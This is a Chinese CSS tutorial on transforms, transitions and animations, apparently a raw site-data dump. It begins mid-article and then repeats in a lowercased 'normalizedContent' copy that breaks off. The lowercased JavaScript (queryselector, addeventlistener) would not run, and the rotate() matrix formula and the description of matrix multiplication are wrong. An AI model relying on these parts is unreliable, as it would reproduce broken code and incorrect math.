过渡事件\n\n在上面那个例子，触发的transitionend事件有不少，比如border-radius对应就有4个（因为它有4个角），比如padding也触发4个（上右下左4个边距）。\n\n我们可以监听transitionend事件，示例如下。transitionend事件有三个重要属性，propertyName：刚完成过渡的CSS属性名；pseudoElement：发生过渡的伪元素；elapsedTime：过渡持续的时间。\n\ndocument.querySelector("div").addEventListener("transitionend", function(e) {\n  console.log(e.propertyName, e.pseudoElement, e.elapsedTime);\n});\n\n\n1\n2\n3\n\n\n仅当属性值成功过渡到新值时，transitionend 事件才会触发。如果过渡被中断（比如同一元素的同一属性发生了另一次更改），则 transitionend 事件不会被触发。\n\n# 3.3.2 过渡时间\n\ntransition-duration一定得是非负值，并且单位一定要带上，比如0s或0ms。如果transition-duration里有负值，这个时间将会失效。transition-duration和transition-delay的总和只要大于0了，就一定会触发transitionend事件。\n\n可能会想为什么说他俩总和大于0？transition-duration是要大于等于0，而transition-delay是可以有负值的。transition-delay负值表示立即执行，并且会影响到总过渡时间，看一下下面这个例子。\n\n<html>\n<head>\n    <style type="text/css">\n    div.outer {\n        width: 300px;\n        padding-top: 50px;\n        border: 1px solid blue;\n    }\n    div.inner {\n        width: 100px;\n        height: 50px;\n        border: 1px solid red;\n        transition: transform 4s linear -2s;\n    }\n    div.active {\n        transform: translateX(200px);\n    }\n    </style>\n</head>\n<body>\n    \x3c!--鼠标悬浮于此时，立即往右位移100px，然后剩余2秒继续位移100px--\x3e\n    <div class="outer">\n        <div class="inner"></div>\n    </div>\n    <script>\n    document.body.querySelector(".outer").addEventListener("mouseover", function(e) {\n        document.body.querySelector(".inner").classList.add("active");\n    });\n    document.body.querySelector(".outer").addEventListener("mouseleave", function(e) {\n        document.body.querySelector(".inner").classList.remove("active");\n    });\n    <\/script>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n可以看到transition-delay为负两秒，总时间是4-2=2秒，首先是瞬间完成100px的位移，然后继续完成剩下的，这两个阶段应该完成的距离与他们时间占比有关。\n\n# 3.3.3 过渡方式\n\ntransition-timing-function 的值有 ease（慢快慢）、linear（线性）、ease-in（慢快）、ease-out（快慢）、ease-in-out（与ease类似）、step-start、step-end、step(n, start) （其中 n 为插值步数）、cubic-bezier(x1, y1, x2, y2)（三次贝塞尔曲线）\n\n\n\n\n\n\n# 四、动画\n\n\n# 4.1 动画能做什么\n\n过渡只是控制指定属性从开始值到结束值这一平滑的过程，在中间是不能给它加上超出开始或结束的其他值的，不然就会打断过渡。\n\n为了达到那种细颗粒的更灵活的控制，CSS提供animation这个功能，可以定义多个关键帧以及所需的属性值。用法：animation: duration timing-function delay iteration-count direction fill-mode play-state name，关键帧定义是@keyframes xxx，animation中的name就是关键帧的名字xxx。\n\n<html>\n<head>\n    <style type="text/css">\n    div {\n        width: 300px;\n        height: 100px;\n        border: 1px solid blue;\n        animation: 3s linear 0s infinite normal both running slidein;\n    }\n    @keyframes slidein {\n      from { transform: scale(0); }\n      to   { transform: scale(1); }\n    }\n    </style>\n</head>\n<body>\n    <div></div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# 4.2 动画关键帧\n\n可以只定义开始和结尾，使用的是from和to，上一节例子里就是使用的这两个关键字。除了控制开始和结尾，我们还能在中途改变属性值，那就是使用百分比来控制，这个百分比是动画持续时间的时间百分比。\n\n<html>\n<head>\n    <style type="text/css">\n    div {\n        width: 300px;\n        height: 100px;\n        background-color:  blue;\n        animation: 3s linear 0s infinite normal both running slidein;\n    }\n    @keyframes slidein {\n      0% { transform: scale(0); background-color:  blue; }\n      33% { background-color: darkblue; }\n      66% { background-color: yellow; }\n      100% { transform: scale(1); background-color: red; }\n    }\n    </style>\n</head>\n<body>\n    <div></div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n# 4.2.1 关键帧设置问题\n\n如果没有定义from、to、0%、100%，那CSS会按照没有动画时的样式自动给他们定义对应的关键帧，也就是使用默认状态。如果有同名的from、to、x%，两者会结合但后面会覆盖前面的属性。\n\n<html>\n<head>\n    <style type="text/css">\n    div {\n        width: 300px;\n        height: 100px;\n        background-color:  blue;\n        animation: 3s linear 0s 1 normal both running slidein;\n    }\n    @keyframes slidein {\n      33% { background-color: darkblue; }\n      66% { background-color: yellow; }\n      90% { background-color: green; }\n      90% { background-color: red; }\n    }\n    </style>\n</head>\n<body>\n    \x3c!--动画只播一次，最开始是蓝色，然后暗蓝，然后黄色，然后红色（覆盖绿色），最后是蓝色--\x3e\n    <div></div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n还有些要注意的，最好不要对height: auto和height: 300px之间设置动画，因为它没有中间点，就算设置了动画也是不可控的，可能达不到你想要的效果。除了auto还有none这种，visibility: hidden 和 visibility: visible也是。\n\n# 4.2.2 动态修改关键帧\n\ncss提供了三个接口用于查看、删除、增加关键帧。首先得获取目前的css样式，类似于这样的document.styleSheets[n].cssRules[m]，然后就可以对这个对象使用findRule()、deleteRule()和appendRule()了，可以看下面这个例子。\n\n<html>\n<head>\n    <style type="text/css">\n    div {\n        width: 300px;\n        height: 100px;\n        background-color:  blue;\n        animation: 3s linear 0s 1 normal both running slidein;\n    }\n    @keyframes slidein {\n      33% { background-color: darkblue; }\n      66% { background-color: yellow; }\n      90% { background-color: green; }\n      90% { background-color: red; }\n    }\n    </style>\n</head>\n<body>\n    <div></div>\n    <script>\n    // 这里自己找清楚关键帧在哪里\n    var myAnimation = document.styleSheets[0].cssRules[1];\n    // 查看关键帧里33%的内容\n    var aRule = myAnimation.findRule("33%").cssText;\n    // 去掉这条90% { background-color: red; }的内容，如果有重复先去掉最底下的\n    myAnimation.deleteRule("90%");\n    // 再去掉这条90% { background-color: green; }的内容\n    // myAnimation.deleteRule("90%");\n    // 添加最后一条关键帧\n    myAnimation.appendRule("100% {background-color: white;}");\n    <\/script>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n动画还有对应的animationstart、animationend和animationiteration这三个事件，分别是在元素的动画结束时，开始时，或者完成一次迭代时触发，通过监听这些事件，可以做出更多动画变化。\n\n\n# 4.3 动画的几个属性\n\nanimation是可以分开写的，如下animation-duration、animation-timing-function、animation-delay、animation-iteration-count、animation-direction、animation-fill-mode、animation-play-state和animation-name。前三个和过渡中同名属性几乎一样，可以跳转到对应章节查看。\n\n# 4.3.1 iteration-count\n\nanimation-iteration-count表示动画播放次数，只能是非负值。如果不设置，动画默认播放一次。如果设置成infinite，动画会无限播放下去。如果设置成浮点数，整数好理解就是整数次，而小数部分就单次时间的百分比。\n\n# 4.3.2 direction\n\nanimation-direction表示动画播放方向，有四个值：\n\n * normal，正向播放，如果是循环，播完又回到起点。\n * reverse，反向播放，如果是循环，播完又回到“终点”（原终点）。\n * alternate，正向交替播放，先正向播一遍然后反向播一遍，功能函数也反向，比如ease-in在反向时成为ease-out。\n * alternate-reverse，反向交替播放，先反向播一遍然后正向播一遍，功能函数也反向，比如ease-in在反向时成为ease-out。\n\n# 4.3.3 fill-mode\n\nanimation-fill-mode表示动画没有开始或者已经结束时元素的样式采取什么保留方案，如果不设置fill-mode（值为none），在开始前和结束后都是采用默认的样式，但是在一些场景下我们需要保留动画最后状态下的样式。除了none还有三种方案：\n\n * forwards，保留由执行期间遇到的最后一个关键帧的样式，最后一个关键帧取决于animation-direction和animation-iteration-count的值。\n * backwards，执行前应用第一个关键帧中定义的值（尽管在animation-delay期间），第一个关键帧取决于animation-direction的值。\n * both，同时采用forwards和backwards方案。\n\n# 4.3.4 play-state\n\nanimation-play-state表示动画动画是否运行或者暂停，有两个值：running和paused。可以通过查询它来确定动画是否正在运行。另外，它的值可以被设置为暂停和恢复的动画的重放。\n\n/*使用不同class来控制播放和暂停*/\n.active {\n  animation-play-state: running;\n}\n.paused {\n  animation-play-state: paused;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n',normalizedContent:'# 变换、过渡、动画\n\n\n# 一、css坐标系\n\n在css中，系统使用三个轴：x轴（横轴）、y轴（纵轴）、z轴（深度轴）。x轴向右是正方向，向左是负方向；y轴得注意了，它向下是正方向，而向上是负方向的，如果使用过绝对定位的应该能理解到；z轴的正方向是朝向我们开发者的，负值是远离我们的方向（朝屏幕里）。\n\n\n\n/* 左移动5个ems，向下移动33个像素，朝我们移动了200个像素 */\ntranslatex(-5em) translatey(33px) translatez(200px)\n\n\n1\n2\n\n\n\n# 二、变换\n\n\n# 2.1 变换源点\n\n在对一个元素进行变换时，一般都是取它的中心点为坐标系原点（作为变换源点），比如一个矩形就是宽一半高一半的那个点，长方体就是长宽高各一半的那个点。\n\n变换源点是可以修改的，比如transform-origin: 10px 20px，取元素展示尺寸左上角顶点的右边10px和下边20px的位置为变换源点。也可以使用非长度数值，例如left | center | right | top | bottom。\n\n\n\n\n# 2.2 变换类型\n\n在css中可以通过transform属性来让元素进行变换，主要有4种变换类型：移动、缩放、旋转以及倾斜。\n\n# 2.2.1 移动\n\ntransform: translate()是用来移动元素的，translate()需要传一到两个参数告诉css在水平和垂直方向上要移动的距离。当然也可以使用translatex()和translatey()来单独对水平和垂直方向进行移动。参数形式可以是长度数值也可以是百分比，如果是百分比，距离将以元素自身大小的百分比计算。\n\ntranslate()是在2d上进行移动变换的，其实在3d上有translate3d()来进行移动变换，可接受三个参数分别控制x、y、z方向的位移，其效果与组合使用translatex()、translatey()、translatez()是一样的。有一点要注意，translate3d()的第三个参数以及translatez()的参数，也就是z方向的移动参数，暂时不能使用百分比形式。\n\n<html>\n<head>\n    <style type="text/css">\n        div {\n            border: 1px solid #333333;\n            width: 100px;\n            height: 10px;\n            margin-top: 50px;\n            transform: translate(10px, 10px);\n        }\n    </style>\n</head>\n<body>\n    <div></div>\x3c!--向右移动10个像素，向下移动10个像素--\x3e\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n# 2.2.2 缩放\n\ntransform: scale()是用来缩放元素的，scale()需要传一到两个参数告诉css在水平和垂直方向上的缩放系数。当然也可以使用scalex()和scaley()来单独对水平和垂直方向进行缩放。参数形式要是正数才行。\n\nscale()是在2d上进行缩放变换的，其实在3d上有scale3d()来进行缩放变换，可接受三个参数分别控制x、y、z方向的缩放，其效果与组合使用scalex()、scaley()、scalez()是一样的。\n\n<html>\n<head>\n    <style type="text/css">\n        div {\n            border: 1px solid #333333;\n            width: 100px;\n            height: 10px;\n            margin-top: 50px;\n            transform: scale(0.5, 2);\n        }\n    </style>\n</head>\n<body>\n    <div></div>\x3c!--水平缩短一半，垂直放大2倍--\x3e\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n# 2.2.3 旋转\n\ntransform: rotate()是用来旋转元素的，rotate()需要传一个参数告诉css需要旋转什么样的角度。下面这个图例就是最常见的2d旋转效果，其实你仔细想一下它围绕着哪一个轴旋转的？\n\n\n\n是的，上面这个是绕z轴进行旋转的，也就是说rotate()和rotatez()是等价的。移动和缩放是沿着轴方向进行变换，旋转是围绕轴心进行变换，这个一定得理解清楚。\n\nrotate()的旋转轴心是z轴，垂直于电脑屏幕并且正方向是指向观察者（开发者）的，它只接收一个参数（角度单位deg、grad、rad、turn），其参数角度是正值的话就是顺时针旋转，负值是逆时针旋转。\n\n<html>\n<head>\n    <style type="text/css">\n        div {\n            border: 1px solid #333333;\n            width: 100px;\n            height: 10px;\n            margin-top: 50px;\n            transform: rotate(45deg);\n        }\n    </style>\n</head>\n<body>\n    <div></div>\x3c!--没加transform时是水平的，加了transform后div是斜着45度显示的--\x3e\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n有2d平面的旋转当然也有3d的旋转，rotatex()和rotatey()就是分别沿着x轴和y轴的旋转变换，参数形式和rotate()一样。下面两个div你可要想清楚了，要先找到x和y轴再来考虑它的显示效果。\n\n<html>\n<head>\n    <style type="text/css">\n        .div1 {\n            border: 1px solid #333333;\n            width: 100px;\n            height: 10px;\n            margin-top: 50px;\n            transform: rotatex(45deg);\n        }\n        .div2 {\n            border: 1px solid #333333;\n            width: 100px;\n            height: 10px;\n            margin-top: 100px;\n            transform: rotatey(45deg);\n        }\n    </style>\n</head>\n<body>\n    \x3c!--没加transform时看起来高就是10px，加了transform后高在视觉上只有7.07左右，因为10除以了根号2--\x3e\n    <div class="div1"></div>\n    \x3c!--没加transform时看起来宽就是100px，加了transform后宽在视觉上只有70.72左右，因为100除以了根号2--\x3e\n    <div class="div2"></div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n上面这两个例子都是向页面里旋转了45度，只不过轴心一个是x轴一个是y轴。想象轴的正方向指向观察者（开发者），再按照正值顺时针和负值逆时针的转法来旋转的。\n\n# 2.2.4 倾斜\n\ntransform: skew()是用来倾斜元素的，skew()需要传一到两个参数告诉css在水平和垂直方向上的扭曲程度。当然也可以使用skewx()和skewy()来单独对水平和垂直方向进行扭曲。参数形式要是角度单位deg、grad、rad、turn。\n\n怎么理解呢？比如沿横坐标扭曲元素是改变x值，那么y数值是不变的，最后元素显示效果就会是纵轴方向上有倾斜角度。举个最简单的例子，头和身体一部分水平左移了，那么这个人看起来就是竖直方向的左倾斜了，水平处理但出现的是竖直倾斜效果。\n\n那么偏移方向怎么算呢？skewx(param)，param是正值就是y轴正方向往x轴正方向偏移param角度，负值就是y轴正方向往x轴负方向偏移param角度。skewy(param)，param是正值就是x轴正方向往y轴正方向偏移param角度，负值就是x轴正方向往y轴负方向偏移param角度。\n\nps：在3d上没有倾斜，只有2d的。也就说没有skewz()或者skew3d()这样的方法。\n\n<html>\n<head>\n    <style type="text/css">\n        div {\n            border: 1px solid #333333;\n            width: 100px;\n            height: 20px;\n            margin-top: 50px;\n            transform: skew(30deg);\n        }\n    </style>\n</head>\n<body>\n    <div></div>\x3c!--x方向扭曲元素，是竖直方向的倾斜，倾斜角度是于y轴正方向往x轴正方向偏移--\x3e\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# 2.3 组合变换\n\n在一些场景下需要对一个元素进行多次变化，那么就可以使用组合变换，例如#example { transform: rotate(30deg) skewx(-25deg) scaley(2); }。 处理transform里的函数时是从左往右依次进行的，在具体场景里变换顺序是很重要的，比如下面这个例子的两种变换效果是不一样的。\n\nimg#one {\n  transform: translatex(200px) rotate(45deg);\n}\nimg#two {\n  transform: rotate(45deg) translatex(200px);\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n上面这个例子能看出一个问题，我们变换的坐标系不止原点与中心点重合，x、y、z轴方向也是与元素本身这个矩形框的横纵深方向是重合的。旋转或者倾斜后，元素的坐标系xyz方向和页面内的参考坐标系xyz方向可能不一致了，那么下次变换是在现在元素本身坐标系xyz方向上移动。简单来说，变换操作跟页面参考坐标系没有关系，不要想不通它明明应该是往水平方向移动的为什么它却斜着移动的了。\n\n在组合变换中，所有函数都必须正确格式化，也就说只要有一个函数错了，整个transform值都无效。例如img#one { transform: translatex(100px) scale(1.2) rotate(22); }中rotate的入参没有单位，那么整个transform都无效。\n\n\n# 2.4 变换矩阵\n\n像前面的移动、缩放、旋转、倾斜在处理背后都有一个对应的变换矩阵，变换矩阵是建立在线性代数与几何的基础上的。2d变换是3×3矩阵，3d变换时4×4矩阵。transform: matrix()可以直接使用变换矩阵，matrix()函数就是用来接收矩阵数据的。\n\n# 2.4.1 矩阵运算\n\n设a为m × p的矩阵，b为p × n的矩阵，那么称m × n的矩阵c为矩阵a与b的乘积。具体相乘的细节就是，a的第i行与b的第j行对应相乘（因为都有p个）再把p个乘积相加，得到值可以构成c的(i,j)位置上的值。\n\na11, a12, a13     b11, b12, b13     a11*b11+a12*b21+a13*b31, a11*b12+a12*b22+a13*b32, a11*b13+a12*b23+a13*b33\na21, a22, a23  ×  b21, b22, b23  =  a21*b11+a22*b21+a23*b31, a21*b12+a22*b22+a23*b32, a21*b13+a22*b23+a23*b33\na31, a32, a33     b31, b32, b33     a31*b11+a32*b21+a33*b31, a31*b12+a32*b22+a33*b32, a31*b13+a32*b23+a33*b33\n\n\n1\n2\n3\n\n\n# 2.4.2 2d矩阵变换\n\nmatrix(a, b, c, d, tx, ty)对应的2d矩阵如下。可以使用matrix(scalex(), skewy(), skewx(), scaley(), translatex(), translatey())来理解，a和d是放大系数，c和b是倾斜系数，abcd绝对值小于1的话就是旋转系数，但这并不意味matrix是简单的组合变换，实际上简单变换、复杂变换以及组合变换背后才是matrix在运作，要理解但不能误解。\n\na, c, tx\nb, d, ty\n0, 0, 1\n\n\n1\n2\n3\n\n\n普通变换可以转为2d矩阵变换，例如：\n\n * translate(x, y)可以写成matrix(1, 0, 0, 1, x, y)；\n * scale(x, y)可以写成matrix(x, 0, 0, y, 0, 0)；\n * rotate(x)可以写成matrix(cos(x), -sin(x), sin(x), cos(x), 0, 0)；\n * skew(x, y)可以写成matrix(1, tan(y), tan(x) , 1, 0, 0)。\n\n例子：\n\n<html>\n<head>\n    <style type="text/css">\n        div {\n            width: 80px;\n            height: 80px;\n            background-color: skyblue;\n        }\n        .changed {\n            /* 可以写成transform: matrix(1, 2, -1, 1, 80, 80); */\n            transform: translate(80px, 80px) skew(-45deg, 63deg);\n            background-color: pink;\n        }\n    </style>\n</head>\n<body>\n    <div>normal</div>\n    <div class="changed">changed</div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n矩阵计算：\n\n// translate(80px, 80px) 与 skew(-45deg, 63deg)，矩阵形式相乘得到新矩阵就可以使用matrix了\n1, 0, 80     1, -1, 0     1, -1, 80\n0, 1, 80  ×  2,  1, 0  =  2,  1, 80\n0, 0, 1      0,  0, 1     0,  0, 1\n\n\n1\n2\n3\n4\n\n\n你可能想过将matrix(1, 2, -1, 1, 80, 80)的矩阵分拆成两个符合matrix规则的矩阵，然后反推得到translate(80px, 80px)和skew(-45deg, 63deg)。在简单场景下是可以的，比如根据之前提到的matrix(scalex(), skewy(), skewx(), scaley(), translatex(), translatey())， 可能会得到transform: scalex(1) skewy(-45deg) skewx(63deg) scaley(1) translatex(100px) translatey(100px);，但还不够需要再分析。\n\n// 其中x和y是原来的坐标，而x-y+80这个值是新的横坐标值，2x+y+80这个值是新的纵坐标值\n1, -1, 80     x     x-y+80\n2,  1, 80  ×  y  =  2x+y+80\n0,  0, 1      1     1\n\n\n1\n2\n3\n4\n\n * 根据矩阵计算的过程，常数项80没有受到系数干扰，translate(80px, 80px)是最优先的，因为如果先倾斜元素坐标系会改变再去移动就晚了；\n * 没有缩放只有倾斜，那么可以使用skewy(-45deg) skewx(63deg)，但是横纵的倾斜是同时进行的，那么应该是skew(-45deg, 63deg)。\n * 注意1：translate优先的原理分析在组合变换里说过了（顺序很重要）。\n * 注意2：skew要同时处理两个方向，因为如果扭曲完一个方向以达到45度的倾斜效果，那再去扭曲另一个方向达到63度的话之前45度的倾斜效果会受到影响。\n\n如果将上面的transform: matrix(1, 2, -1, 1, 80, 80)改为transform: matrix(2, 2, -1, 2, 80, 80)，此时既有缩放又有倾斜，再来反推是非常困难的，所以不要试图将matrix反推得到组合变换，一般是将复杂的组合变换简写为matrix矩阵变换的形式（为了维护也可以不简写）。\n\n# 2.4.3 3d矩阵变换\n\nmatrix(a, b, c, d, e, f, g, h, i, j, k, l, m, n, o, p)对应的3d矩阵如下。可以使用matrix(scalex(), skewy(), skewx(), scaley(), translatex(), translatey())来理解\n\na, e, i, m\nb, f, j, n\nc, g, k, o\nd, h, l, p\n\n\n1\n2\n3\n4\n\n\n普通3d变换可以转为3d矩阵变换，例如：\n\n * translate3d(x, y, z)可以写成matrix(1,0,0,0,0,1,0,0,0,0,1,0,x,y,z,1)；\n * scale3d(x, y, z)可以写成matrix(x,0,0,0,0,y,0,0,0,0,z,0,0,0,0,1)；\n * 旋转和倾斜比较复杂暂时没查到资料。\n\n\n# 三、过渡\n\n\n# 3.1 元素过渡\n\n元素样式的改变可以在一瞬间就完成，新属性替换旧属性再到重新绘制这个过程一般不会超过16毫秒，即使超过也是一步完成变化的，不会逐渐过渡。\n\ncss提供了transition来控制某个属性在一段时间内属性值变化的过渡效果。用法：transition: property duration timing-function delay，其中property就是被监控的属性，duration是过渡时间，timing-function是过渡方式，delay是延时触发的时间。\n\n<html>\n<head>\n    <style type="text/css">\n        div {\n            width: 100px;\n            height: 20px;\n            background-color: skyblue;\n            transition: background-color 1s linear 3s;\n        }\n        div:hover {\n            background-color: pink;\n        }\n    </style>\n</head>\n<body>\n    \x3c!--当鼠标悬浮时，3秒后div背景颜色开始逐渐变为粉色，过渡用时1秒--\x3e\n    <div>normal</div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# 3.2 过渡多个属性\n\ntransition: property duration timing-function delay是可以分开写的，看个人的习惯了。例如transition-property: transform;、transition-duration: 200ms;、transition-timing-function: ease-in;、transition-delay: 50ms;。\n\ntransition可以同时对多个属性进行过渡，使用,分隔开，同样的transition-property也可以写上多个属性，如果这些属性的过渡效果一样，那么其他的transition-duration、transition-timing-function、transition-delay就可以写一样的了。当然，如果效果不一样duration、timing-function、delay也要使用逗号将值分开。\n\n<html>\n<head>\n    <style type="text/css">\n        div {\n            width: 100px;\n            height: 20px;\n            background-color: skyblue;\n            transition: background-color 1s linear, color 1s linear, width 1s linear;\n        }\n        div:hover {\n            background-color: pink;\n            color: #ffff00;\n            width: 200px;\n        }\n    </style>\n</head>\n<body>\n    <div>normal</div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n<html>\n<head>\n    <style type="text/css">\n        div {\n            width: 100px;\n            height: 20px;\n            background-color: skyblue;\n            /*与上面的例子是一样的效果*/\n            transition-property: background-color, color, width;\n            transition-duration: 1s;\n            transition-timing-function: linear;\n        }\n        div:hover {\n            background-color: pink;\n            color: #ffff00;\n            width: 200px;\n        }\n    </style>\n</head>\n<body>\n    <div>normal</div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n如果transition-property的值只是all的话，表示对所有属性都进行过渡；all也可以放在一群由逗号分隔的属性之前，它有什么意义呢？表示大部分属性都按照同一套过渡效果来进行，而all后面的属性会是例外。除了用all还有个none表示覆盖清除过渡，其实可以将过渡总时间设置为0。\n\n<html>\n<head>\n    <style type="text/css">\n        div {\n          color: #f00;\n          border: 1px solid #00ff00;\n          border-radius: 0;\n          transform: scale(1) rotate(0deg);\n          opacity: 1;\n          box-shadow: 3px 3px rgba(0, 0, 0, 0.1);\n          width: 50px;\n          padding: 50px;\n          transition-property: all, border-radius, opacity;\n          transition-duration: 1s, 3s, 5s;\n        }\n        div.normal:hover {\n            background-color: pink;\n            color: #ffff00;\n            padding: 100px;\n        }\n        div.change:hover {\n            background-color: pink;\n            color: #ffff00;\n            padding: 100px;\n            border-radius: 10px;\n            opacity: 0.1;\n        }\n    </style>\n</head>\n<body>\n    <div class="normal">normal</div>\n    \x3c!--1秒改变背景和字体颜色还有内边距，3秒改变圆角，5秒逐渐透明--\x3e\n    <div class="change">change</div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\n\n# 3.3 使用过渡注意点\n\n# 3.3.1 过渡事件\n\n在上面那个例子，触发的transitionend事件有不少，比如border-radius对应就有4个（因为它有4个角），比如padding也触发4个（上右下左4个边距）。\n\n我们可以监听transitionend事件，示例如下。transitionend事件有三个重要属性，propertyname：刚完成过渡的css属性名；pseudoelement：发生过渡的伪元素；elapsedtime：过渡持续的时间。\n\ndocument.queryselector("div").addeventlistener("transitionend", function(e) {\n  console.log(e.propertyname, e.pseudoelement, e.elapsedtime);\n});\n\n\n1\n2\n3\n\n\n仅当属性值成功过渡到新值时，transitionend 事件才会触发。如果过渡被中断（比如同一元素的同一属性发生了另一次更改），则 transitionend 事件不会被触发。\n\n# 3.3.2 过渡时间\n\ntransition-duration一定得是非负值，并且单位一定要带上，比如0s或0ms。如果transition-duration里有负值，这个时间将会失效。transition-duration和transition-delay的总和只要大于0了，就一定会触发transitionend事件。\n\n可能会想为什么说他俩总和大于0？transition-duration是要大于等于0，而transition-delay是可以有负值的。transition-delay负值表示立即执行，并且会影响到总过渡时间，看一下下面这个例子。\n\n<html>\n<head>\n    <style type="text/css">\n    div.outer {\n        width: 300px;\n        padding-top: 50px;\n        border: 1px solid blue;\n    }\n    div.inner {\n        width: 100px;\n        height: 50px;\n        border: 1px solid red;\n        transition: transform 4s linear -2s;\n    }\n    div.active {\n        transform: translatex(200px);\n    }\n    </style>\n</head>\n<body>\n    \x3c!--鼠标悬浮于此时，立即往右位移100px，然后剩余2秒继续位移100px--\x3e\n    <div class="outer">\n        <div class="inner"></div>\n    </div>\n    <script>\n    document.body.queryselector(".outer").addeventlistener("mouseover", function(e) {\n        document.body.queryselector(".inner").classlist.add("active");\n    });\n    document.body.queryselector(".outer").addeventlistener("mouseleave", function(e) {\n        document.body.queryselector(".inner").classlist.remove("active");\n    });\n    <\/script>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n可以看到transition-delay为负两秒，总时间是4-2=2秒，首先是瞬间完成100px的位移，然后继续完成剩下的，这两个阶段应该完成的距离与他们时间占比有关。\n\n# 3.3.3 过渡方式\n\ntransition-timing-function 的值有 ease（慢快慢）、linear（线性）、ease-in（慢快）、ease-out（快慢）、ease-in-out（与ease类似）、step-start、step-end、step(n, start) （其中 n 为插值步数）、cubic-bezier(x1, y1, x2, y2)（三次贝塞尔曲线）\n\n\n\n\n\n\n# 四、动画\n\n\n# 4.1 动画能做什么\n\n过渡只是控制指定属性从开始值到结束值这一平滑的过程，在中间是不能给它加上超出开始或结束的其他值的，不然就会打断过渡。\n\n为了达到那种细颗粒的更灵活的控制，css提供animation这个功能，可以定义多个关键帧以及所需的属性值。用法：animation: duration timing-function delay iteration-count direction fill-mode play-state name，关键帧定义是@keyframes xxx，animation中的name就是关键帧的名字xxx。\n\n<html>\n<head>\n    <style type="text/css">\n    div {\n        width: 300px;\n        height: 100px;\n        border: 1px solid blue;\n        animation: 3s linear 0s infinite normal both running slidein;\n    }\n    @keyframes slidein {\n      from { transform: scale(0); }\n      to   { transform: scale(1); }\n    }\n    </style>\n</head>\n<body>\n    <div></div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# 4.2 动画关键帧\n\n可以只定义开始和结尾，使用的是from和to，上一节例子里就是使用的这两个关键字。除了控制开始和结尾，我们还能在中途改变属性值，那就是使用百分比来控制，这个百分比是动画持续时间的时间百分比。\n\n<html>\n<head>\n    <style type="text/css">\n    div {\n        width: 300px;\n        height: 100px;\n        background-color:  blue;\n        animation: 3s linear 0s infinite normal both running slidein;\n    }\n    @keyframes slidein {\n      0% { transform: scale(0); background-color:  blue; }\n      33% { background-color: darkblue; }\n      66% { background-color: yellow; }\n      100% { transform: scale(1); background-color: red; }\n    }\n    </style>\n</head>\n<body>\n    <div></div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n# 4.2.1 关键帧设置问题\n\n如果没有定义from、to、0%、100%，那css会按照没有动画时的样式自动给他们定义对应的关键帧，也就是使用默认状态。如果有同名的from、to、x%，两者会结合但后面会覆盖前面的属性。\n\n<html>\n<head>\n    <style type="text/css">\n    div {\n        width: 300px;\n        height: 100px;\n        background-color:  blue;\n        animation: 3s linear 0s 1 normal both running slidein;\n    }\n    @keyframes slidein {\n      33% { background-color: darkblue; }\n      66% { background-color: yellow; }\n      90% { background-color: green; }\n      90% { background-color: red; }\n    }\n    </style>\n</head>\n<body>\n    \x3c!--动画只播一次，最开始是蓝色，然后暗蓝，然后黄色，然后红色（覆盖绿色），最后是蓝色--\x3e\n    <div></div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n还有些要注意的，最好不要对height: auto和height: 300px之间设置动画，因为它没有中间点，就算设置了动画也是不可控的，可能达不到你想要的效果。除了auto还有none这种，visibility: hidden 和 visibility: visible也是。\n\n# 4.2.2 